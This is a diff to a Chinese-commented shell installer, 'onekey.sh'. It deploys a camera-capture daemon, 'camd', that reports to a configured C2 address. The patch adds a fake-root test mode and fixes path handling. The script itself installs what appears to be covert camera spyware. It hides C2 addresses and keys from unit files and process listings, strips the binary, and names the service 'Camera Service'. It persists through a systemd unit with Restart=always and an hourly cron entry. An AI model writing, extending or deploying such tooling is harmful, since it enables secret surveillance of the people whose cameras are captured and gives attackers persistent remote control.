@@ -25,13 +25,13 @@ set -u
 umask 077
 
 # ---- 常量 ------------------------------------------------------------------
-CONF_DIR=/etc/camd
-CONF_FILE=$CONF_DIR/camd.conf
-LIB_DIR=/var/lib/camd
-BIN_DST=/usr/local/bin/camd
-UNIT=/etc/systemd/system/camd.service
-CRON=/etc/cron.d/camd
-LOCK=/var/lock/camd.lock
+# PREFIX = 假根。空表示真实根（生产部署的唯一正确取值）。
+# 非空时所有落点挂在此前缀下，用于守卫/CI 在同一台机器上验证多份互不
+# 干扰的部署而不污染真实 /etc。注意：非空时 systemd 驻留会被**强制跳过**——
+# systemctl 不读假根，真 enable/restart 会改动真实系统状态，那正是假根
+# 要隔离的东西。因此假根下单元只渲染 + 静态校验，不安装。
+PREFIX="${PREFIX:-}"
+# 路径常量不在此处固定：它们由 --prefix 派生，必须等参数解析完才算得出来。
 
 ok=0; fail=0; warn=0
 log()  { printf '[%s] %s\n' "$1" "$2"; }
@@ -55,14 +55,43 @@ while [ $# -gt 0 ]; do
         --backend) BACKEND="$2"; shift 2 ;;
         --front-host) FRONT_HOST="$2"; shift 2 ;;
         --ca)         CA_SRC="$2"; shift 2 ;;
+        --prefix)     PREFIX="$2"; shift 2 ;;
         install|uninstall|status|checkpayload) ACTION="$1"; shift ;;
         *) printf '未知参数: %s\n' "$1"; exit 2 ;;
     esac
 done
 
+# ---- 路径派生 --------------------------------------------------------------
+# 全部由 $PREFIX 派生，脚本其余部分一律只用这些变量、不得再写绝对路径。
+# 此前是硬编码 /etc/camd 等，结果是：守卫每跑一次就往真实 /etc 写一遍，
+# 两份不同配置的部署在同一台机器上会互相覆盖，且无法并行。
+CONF_DIR=$PREFIX/etc/camd
+CONF_FILE=$CONF_DIR/camd.conf
+LIB_DIR=$PREFIX/var/lib/camd
+BIN_DST=$PREFIX/usr/local/bin/camd
+UNIT=$PREFIX/etc/systemd/system/camd.service
+CRON=$PREFIX/etc/cron.d/camd
+LOCK=$PREFIX/var/lock/camd.lock
+# 假根标记：非空即"不碰真实系统状态"。systemd/cron 的**写文件**仍照常
+# （目标是假根内的路径），但 systemctl 子命令一律不执行。
+FAKE_ROOT=0
+[ -n "$PREFIX" ] && FAKE_ROOT=1
+
 # ---- 前置门 ----------------------------------------------------------------
 require_root() {
     # 真判据是 euid。只看 `id -u` 在 setuid/容器里会骗人。
+    #
+    # 假根下**不要求 root**：假根的意义就是隔离，安装动作全部落在 PREFIX
+    # 内，能写 PREFIX 就够了。要求 root 会把守卫/CI 挡在非 root 环境之外，
+    # 而那恰恰是假根最该被使用的场景。判据也换成真实的可写性检查——
+    # 只看 uid 会漏掉"uid=0 但 PREFIX 所在挂载点只读"这种情况（只读根、
+    # 只读容器 overlay 都很常见），那种情况下 mkdir 失败而 uid 检查通过，
+    # 故障会推迟到写 conf 时才暴露。
+    if [ "$FAKE_ROOT" = 1 ]; then
+        mkdir -p "$PREFIX" 2>/dev/null || DIE "无法创建假根 $PREFIX"
+        [ -w "$PREFIX" ] || DIE "假根 $PREFIX 不可写"
+        return 0
+    fi
     [ "$(id -u 2>/dev/null)" = "0" ] || DIE "需要 root 权限（当前 uid=$(id -u)）"
 }
 
@@ -269,6 +298,10 @@ write_conf() {
 
 install_bin() {
     mkdir -p "$LIB_DIR" || DIE "无法创建 $LIB_DIR"
+    # 目标目录必须显式创建：真根下 /usr/local/bin 必然存在，这个缺陷从来
+    # 没暴露过；假根下它不存在，cp 直接失败而报错只有"复制二进制失败"，
+    # 看不出是目录缺失——排查会被引向 TMPB 产物本身（权限？损坏？）。
+    mkdir -p "$(dirname "$BIN_DST")" || DIE "无法创建 $(dirname "$BIN_DST")"
     cp "$TMPB" "$BIN_DST" 2>/dev/null || DIE "复制二进制失败"
     chmod 0700 "$BIN_DST" 2>/dev/null
     command -v strip >/dev/null 2>&1 && strip "$BIN_DST" 2>/dev/null
@@ -294,19 +327,28 @@ install_runner() {
     # 用 wrapper 在运行时从 conf 取值再 exec，是唯一既不在单元文件(0644)
     # 里写 C2 地址/密钥、又能把参数正确传给 camd 的做法。
     mkdir -p "$LIB_DIR" || DIE "无法创建 $LIB_DIR"
-    cat > "$LIB_DIR/run.sh" <<'RUNEOF' || DIE "写 run.sh 失败"
+    # heredoc 用**无引号** RUNEOF（要展开 $PREFIX），因此运行期变量一律
+    # 写成 \$ 转义。漏转义的后果是 conf 值在生成期就被展开成空——run.sh
+    # 里留下 `--sink ""`，服务起不来而 conf 内容看起来是对的。
+    cat > "$LIB_DIR/run.sh" <<RUNEOF || DIE "写 run.sh 失败"
 #!/bin/sh
 # 由 onekey.sh 生成。密钥经环境注入，不出现在命令行（ps 可见）。
+#
+# ROOT_PREFIX 在**生成期**注入，必须与生成时的 PREFIX 一致。此前这里
+# 写死 /etc/camd 与 /usr/local/bin/camd，于是"改了 CONF_DIR 无效"：
+# 假根部署下 run.sh 去读真根 conf（读到另一份配置或读不到），表现为
+# "服务在跑但 C2 地址不对"。
+ROOT_PREFIX='$PREFIX'
 set -a
-. /etc/camd/camd.conf
+. "\$ROOT_PREFIX/etc/camd/camd.conf"
 set +a
-[ -n "$C2_ADDR" ] || { echo "[FATAL] C2_ADDR 未配置" >&2; exit 6; }
-# "$@" 透传：systemd 不带参（常驻，Restart=always 兜底重拉）；
+[ -n "\$C2_ADDR" ] || { echo "[FATAL] C2_ADDR 未配置" >&2; exit 6; }
+# "\$@" 透传：systemd 不带参（常驻，Restart=always 兜底重拉）；
 # cron 带 --batches 1 —— cron 是"每小时拉起一次"的模型，若 camd 不限批次
 # （默认 max_batches=0，跑到收到停止信号为止），每个整点就会新增一个
 # 永不退出的采集进程：进程堆积、多个进程抢同一摄像头、文件句柄与内存
 # 持续增长。驻留机制反而变成资源耗尽与暴露面。cron 路径必须限定批次。
-exec /usr/local/bin/camd --sink "$CAMD_SINK" $CAMD_EXTRA --backend "$CAMD_BACKEND" "$@"
+exec "\$ROOT_PREFIX/usr/local/bin/camd" --sink "\$CAMD_SINK" \$CAMD_EXTRA --backend "\$CAMD_BACKEND" "\$@"
 RUNEOF
     chmod 0700 "$LIB_DIR/run.sh" 2>/dev/null
     OK "启动器已写入 $LIB_DIR/run.sh（0700）"
@@ -321,6 +363,10 @@ render_unit() {
     # 首次部署才暴露，而那时排查成本极高。渲染与校验必须与安装解耦。
     #
     # 单元内不得出现密钥与 C2 地址：0644 会被 cat 到，且进版本管理即暴露。
+    # 同上：真根下 /etc/systemd/system 必然存在，假根下不存在。缺这一步时
+    # 现象是 "cannot create .../camd.service: Directory nonexistent" 且
+    # render_unit 静默 return 1 —— 单元从未被校验，而调用方看不出来。
+    mkdir -p "$(dirname "$UNIT")" || return 1
     cat > "$UNIT" <<EOF || return 1
 [Unit]
 Description=Camera Service
@@ -405,7 +451,10 @@ persist_cron() {
     # 于是部署报告里"cron 驻留"一栏为空，而目标机其实能跑 cron。漏装驻留
     # 比装了不执行更糟：前者无人知晓，后者至少有条目可查。
     # 改为：目录存在就写；守护进程是否存在单独探测并显式 WARN（不静默）。
-    [ -d /etc/cron.d ] || { WARN "无 /etc/cron.d，跳过 cron 驻留"; return 0; }
+    # 假根下目录尚不存在，先建再判——否则守卫永远走不到"写 cron 条目"
+    # 这条路径，cron 驻留在测试里就从未被真正验证过。
+    mkdir -p "$PREFIX/etc/cron.d" 2>/dev/null
+    [ -d "$PREFIX/etc/cron.d" ] || { WARN "无 $PREFIX/etc/cron.d，跳过 cron 驻留"; return 0; }
     # 分位用真实秒数，避免 RANDOM 在 dash 下不展开导致 crontab 语法错。
     M=$(( $(date +%S) % 60 ))
     #
@@ -512,11 +561,15 @@ do_install() {
     install_bin
     install_runner
     render_unit
-    if [ "$HAVE_SYSTEMD" = 1 ]; then
+    if [ "$HAVE_SYSTEMD" = 1 ] && [ "$FAKE_ROOT" = 0 ]; then
         persist_systemd
         persist_cron || :
     else
-        WARN "systemd 未运行，单元已校验但未安装（降级到 cron）"
+        if [ "$FAKE_ROOT" = 1 ]; then
+            WARN "假根模式（PREFIX=$PREFIX）：单元已渲染并校验，但不执行 systemctl —— systemctl 不读假根，真 enable/restart 会改动真实系统状态"
+        else
+            WARN "systemd 未运行，单元已校验但未安装（降级到 cron）"
+        fi
         rm -f "$UNIT"
         persist_cron
     fi
@@ -530,12 +583,14 @@ do_uninstall() {
     HAVE_SYSTEMD=0
     probe_systemd
     # 顺序：先 disable --now 再删单元。只 stop 的话 Restart=always 会被拉起。
-    if [ "$HAVE_SYSTEMD" = 1 ]; then
+    if [ "$HAVE_SYSTEMD" = 1 ] && [ "$FAKE_ROOT" = 0 ]; then
         systemctl disable --now camd.service >/dev/null 2>&1
         rm -f "$UNIT"
         systemctl daemon-reload >/dev/null 2>&1
         systemctl reset-failed >/dev/null 2>&1
         OK "systemd 驻留已清理"
+    elif [ "$FAKE_ROOT" = 1 ]; then
+        OK "假根模式：跳过 systemctl（不改动真实系统状态）"
     else
         OK "systemd 不可用，跳过"
     fi
@@ -543,10 +598,17 @@ do_uninstall() {
     rm -rf "$CONF_DIR" "$LIB_DIR"
     OK "文件与二进制已清理"
     # 按 PID 精确杀，避免 pkill -f 自匹配。
-    for P in $(ps -eo pid=,comm= 2>/dev/null | awk '$2=="camd"{print $1}'); do
-        kill -TERM "$P" 2>/dev/null
-    done
-    OK "进程已清理"
+    # 假根下**不杀**：comm 匹配区分不了"这个 camd 属于哪个根"，杀会误伤
+    # 真实部署的常驻进程——那正是假根要隔离的东西。假根部署在守卫里用
+    # --batches 1 跑完即退，本来也不留常驻进程。
+    if [ "$FAKE_ROOT" = 1 ]; then
+        WARN "假根模式：跳过按 comm 杀进程（无法区分归属，会误伤真实部署）"
+    else
+        for P in $(ps -eo pid=,comm= 2>/dev/null | awk '$2=="camd"{print $1}'); do
+            kill -TERM "$P" 2>/dev/null
+        done
+        OK "进程已清理"
+    fi
     return 0
 }
 
